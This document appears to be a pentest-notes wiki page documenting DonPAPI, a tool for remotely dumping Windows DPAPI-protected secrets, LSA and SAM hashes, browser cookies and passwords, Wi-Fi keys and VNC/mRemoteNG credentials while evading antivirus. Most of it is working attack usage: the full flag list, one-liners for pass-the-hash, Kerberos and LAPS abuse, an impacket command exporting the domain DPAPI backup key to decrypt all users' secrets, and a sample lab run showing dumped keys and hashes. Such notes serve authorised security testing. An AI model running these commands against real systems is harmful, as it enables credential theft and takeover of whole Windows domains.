---
title : "DonPAPI"
# pre : ' '
description : "Dumping revelant information on compromised targets without AV detection."
date : 2022-02-08T15:34:19+01:00
# hidden : true
# draft : true
weight : 130
# tags : ['']
---

---

Dumping revelant information on compromised targets without AV detection

### DPAPI dumping

Lots of credentials are protected by [DPAPI](https://docs.microsoft.com/en-us/dotnet/standard/security/how-to-use-data-protection).

We aim at locating those "secured" credentials, and retrieve them using:

- User password
- Domaine DPAPI BackupKey
- Local machine DPAPI Key (protecting `TaskScheduled` blob)

### Curently gathered info

- Windows credentials (Taskscheduled credentials & a lot more)
- Windows Vaults
- Windows RDP credentials
- AdConnect (still require a manual operation)
- Wifi key
- Intenet explorer Credentials
- Chrome cookies & credentials
- Firefox cookies & credentials
- VNC passwords
- mRemoteNG password (with default config)

### Check for a bit of compliance

- SMB signing status
- OS/Domain/Hostname/Ip of the audited scope

### Operational use

With local admin account on a host, we can:

- Gather machine protected DPAPI secrets
  - ScheduledTask that will contain cleartext login/password of the account configured to run the task
  - Wi-Fi passwords
- Extract Masterkey's hash value for every user profiles (masterkeys beeing protected by the user's password, let's try to crack them with Hashcat)
- Identify who is connected from where, in order to identify admin's personal computers.
- Extract other non-dpapi protected secrets (VNC/Firefox/mRemoteNG)
- Gather protected secrets from IE, Chrome, Firefox and start reaching the Azure tenant.

With a user password, or the domain PVK we can unprotect the user's DPAPI secrets.

## Installation

```plain
git clone https://github.com/login-securite/DonPAPI.git
python3 -m pip install -r requirements.txt
```

## Usage

```plain
DonPAPI.py [-h] [-credz CREDZ] [-pvk PVK] [-d] [-t number of threads] [-o OUTPUT_DIRECTORY] [-H LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key] [-local_auth] [-laps] [-dc-ip ip address]
                  [-target-ip ip address] [-port [destination port]] [-R] [--type TYPE] [-u] [--target] [--no_browser] [--no_dpapi] [--no_vnc] [--no_remoteops] [--GetHashes] [--no_recent]
                  [--no_sysadmins] [--from_file FROM_FILE]
                  [target]
```

## Flags

```plain
usage: 

SeatBelt implementation.

positional arguments:
  target                [[domain/]username[:password]@]<targetName or address>

options:
  -h, --help            show this help message and exit
  -credz CREDZ          File containing multiple user:password or user:hash for masterkeys decryption
  -pvk PVK              input backupkey pvk file
  -d, --debug           Turn DEBUG output ON
  -t number of threads  number of threads
  -o OUTPUT_DIRECTORY, --output_directory OUTPUT_DIRECTORY
                        output log directory

authentication:
  -H LMHASH:NTHASH, --hashes LMHASH:NTHASH
                        NTLM hashes, format is LMHASH:NTHASH
  -no-pass              don't ask for password (useful for -k)
  -k                    Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the ones specified in
                        the command line
  -aesKey hex key       AES key to use for Kerberos Authentication (1128 or 256 bits)
  -local_auth           use local authentification
  -laps                 use LAPS to request local admin password

connection:
  -dc-ip ip address     IP Address of the domain controller. If omitted it will use the domain part (FQDN) specified in the target parameter
  -target-ip ip address
                        IP Address of the target machine. If omitted it will use whatever was specified as target. This is useful when target is the NetBIOS name and you cannot resolve it
  -port [destination port]
                        Destination port to connect to SMB Server

Reporting:
  -R, --report          Only Generate Report on the scope
  --type TYPE           only report "type" password (wifi,credential-blob,browser-internet_explorer,LSA,SAM,taskscheduler,VNC,browser-chrome,browser-firefox
  -u, --user            only this username
  --target              only this target (url/IP...)

attacks:
  --no_browser          do not hunt for browser passwords
  --no_dpapi            do not hunt for DPAPI secrets
  --no_vnc              do not hunt for VNC passwords
  --no_remoteops        do not hunt for SAM and LSA with remoteops
  --GetHashes           Get all users Masterkey's hash & DCC2 hash
  --no_recent           Do not hunt for recent files
  --no_sysadmins        Do not hunt for sysadmins stuff (mRemoteNG, vnc, keepass, lastpass ...)
  --from_file FROM_FILE
                        Give me the export of ADSyncQuery.exe ADSync.mdf to decrypt ADConnect password
```

### Example oneliners

### Dump all secrets of the target machine with an admin account

```plain
DonPAPI.py domain/user:passw0rd@target
```

### Using user's hash

```plain
DonPAPI.py --hashes <LM>:<NT> domain/user@target
```

### Using kerberos (-k) and local auth (-local_auth)

```plain
DonPAPI.py -k domain/user@target
DonPAPI.py -local_auth user@target
```

### Using a user with LAPS password reading rights

```plain
DonPAPI.py -laps domain/user:passw0rd@target
```

It is also possible to provide the tool with a list of credentials that will be tested on the target. DonPAPI will try to use them to decipher masterkeys.

This credential file must have the following syntax:

```plain
user1:pass1
user2:pass2
...
```

```plain
DonPAPI.py -credz credz_file.txt domain/user:passw0rd@target
```

When a domain admin user is available, it is possible to dump the domain backup key using impacket `dpapi.py` tool.

```plain
dpapi.py backupkeys --export -t domain/user:passw0rd@target_dc_ip
```

This backup key (pvk file) can then be used to dump all domain user's secrets!

`python DonPAPI.py -pvk domain_backupkey.pvk domain/user:passw0rd@domain_network_list`

Target can be an IP, IP range, CIDR, file containing list targets (one per line)

### Practical Example

Captured credentials etc. is saved in the installation folder `DonPAPI/<target-ip>`

### Dump all secrets of the target machine with an admin account (practical)

```plain
$ python3 DonPAPI.py offsec.nl/administrator:Welkom1234@10.20.30.10
Impacket v0.9.25.dev1+20220201.191645.d8679837 - Copyright 2021 SecureAuth Corporation

INFO Loaded 1 targets
INFO [10.20.30.10] [+] SRV2019 (domain:offsec.nl) (Windows 10.0 Build 17763) [SMB Signing Enabled]
INFO host:  \\10.10.20.229, user: administrator, active:     0, idle:     1
INFO [10.20.30.10] [+] Found user Administrator
INFO [10.20.30.10] [+] Found user All Users
INFO [10.20.30.10] [+] Found user Default
INFO [10.20.30.10] [+] Found user Default User
INFO [10.20.30.10] [+] Found user Public
INFO [10.20.30.10]  [+] Dumping LSA Secrets
INFO [10.20.30.10] [-] Found DPAPI Machine key : 0x1e27f1e22fdc39e9a46e78002a29fc9c4b9cf075
INFO [10.20.30.10] [-] Found DPAPI User key : 0x2b9209d42285120145d27fefca0493b20342a6c7
INFO [10.20.30.10] [-] Found DPAPI Machine key : 0x683c3680156a0710f42d43eb443cce6fc5e7c9a5
INFO [10.20.30.10] [-] Found DPAPI User key : 0x64a6a505147150c92e46f7cbda99beb3116da651
INFO [10.20.30.10] [+]  LSA :  NL$KM_history : 055062e305c059da705618cdf20f6e4f3de1a069d66372465907b2cd1f8dff5773b044d381a13af417c5a677a2db7c3206ff5f18181337cdc8612dee5aa9c041 
INFO [10.20.30.10]  [+] Dumping SAM Secrets
ERROR SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
INFO [10.20.30.10] [+]  SAM : Collected 4 hashes 
INFO [10.20.30.10] [+] Gathering DPAPI Secret blobs on the target
INFO [10.20.30.10] [+]  
[CREDENTIAL]
LastWritten : 2022-02-05 08:10:33
Flags       : 48 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
Persist     : 0x2 (CRED_PERSIST_LOCAL_MACHINE)
Type        : 0x1 (CRED_PERSIST_SESSION)
Target      : WindowsLive:target=virtualapp/didlogical
Description : PersistedCredential
Unknown     : 
Username    : 02revvqacndgtgkt
Unknown3     : 
 
INFO [10.20.30.10] [+] Gathering Wifi Keys
INFO [10.20.30.10] [+] Gathering Vaults
INFO [10.20.30.10] [+] Gathering Chrome Secrets 
INFO [10.20.30.10] [+] Gathering Mozilla Secrets 
INFO [10.20.30.10] [+] Gathering VNC Passwords
INFO [10.20.30.10] [+] Gathering mRemoteNG Secrets 
INFO [10.20.30.10] [+] Gathering Recent Files and Desktop Files 
```

### Captured credentials / overview

```plain
~/DonPAPI/10.20.30.10 

$ ls -l            
total 16
-rw-r--r--  1 crypt0rr  staff   1.1K Feb 21 11:25 LSA.secrets
drwxr-xr-x  4 crypt0rr  staff   128B Feb 21 11:25 PROGRAM FILES
drwxr-xr-x  4 crypt0rr  staff   128B Feb 21 11:25 PROGRAMFILES
drwxr-xr-x  4 crypt0rr  staff   128B Feb 21 11:25 Program Files (x86)
drwxr-xr-x  3 crypt0rr  staff    96B Feb 21 11:25 ProgramData
drwxr-xr-x  4 crypt0rr  staff   128B Feb 21 11:25 ProgramFiles(x86)
-rw-r--r--  1 crypt0rr  staff   254B Feb 21 11:25 SAM.sam
drwxr-xr-x  7 crypt0rr  staff   224B Feb 21 11:25 Users
drwxr-xr-x  3 crypt0rr  staff    96B Feb 21 11:25 Windows
```

## URL List

- [Github.com - DonPAPI](https://github.com/login-securite/DonPAPI)
